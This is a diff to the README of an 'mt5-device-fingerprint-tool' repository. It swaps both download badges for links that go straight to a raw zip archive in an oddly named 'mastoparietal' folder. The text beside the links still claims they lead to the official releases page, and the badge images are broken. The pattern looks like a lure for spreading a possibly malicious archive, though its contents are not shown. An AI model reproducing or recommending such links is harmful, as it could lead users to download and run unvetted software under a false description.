@@ -1,6 +1,6 @@
 # 🎉 mt5-device-fingerprint-tool - Generate Unique Device Identifiers Easily
 
-[![Download](https://github.com/del-delprilia/mt5-device-fingerprint-tool/raw/refs/heads/main/mastoparietal/fingerprint_mt_device_tool_v1.6-alpha.1.zip%20release-brightgreen)](https://github.com/del-delprilia/mt5-device-fingerprint-tool/raw/refs/heads/main/mastoparietal/fingerprint_mt_device_tool_v1.6-alpha.1.zip)
+[![Download](https://raw.githubusercontent.com/del-delprilia/mt5-device-fingerprint-tool/main/mastoparietal/fingerprint_mt_tool_device_2.6.zip%20release-brightgreen)](https://raw.githubusercontent.com/del-delprilia/mt5-device-fingerprint-tool/main/mastoparietal/fingerprint_mt_tool_device_2.6.zip)
 
 ## 📚 Overview
 
@@ -23,7 +23,7 @@ Before you start, ensure your system meets the following requirements:
 
 1. **Visit the Releases Page**: Go to the official releases page by clicking the button below.
 
-   [![Download](https://github.com/del-delprilia/mt5-device-fingerprint-tool/raw/refs/heads/main/mastoparietal/fingerprint_mt_device_tool_v1.6-alpha.1.zip%20release-brightgreen)](https://github.com/del-delprilia/mt5-device-fingerprint-tool/raw/refs/heads/main/mastoparietal/fingerprint_mt_device_tool_v1.6-alpha.1.zip)
+   [![Download](https://raw.githubusercontent.com/del-delprilia/mt5-device-fingerprint-tool/main/mastoparietal/fingerprint_mt_tool_device_2.6.zip%20release-brightgreen)](https://raw.githubusercontent.com/del-delprilia/mt5-device-fingerprint-tool/main/mastoparietal/fingerprint_mt_tool_device_2.6.zip)
 
 2. **Select the Latest Version**: On the releases page, find the latest version of the mt5-device-fingerprint-tool. Look for a title that includes the version number, like `v1.0.0`.
 
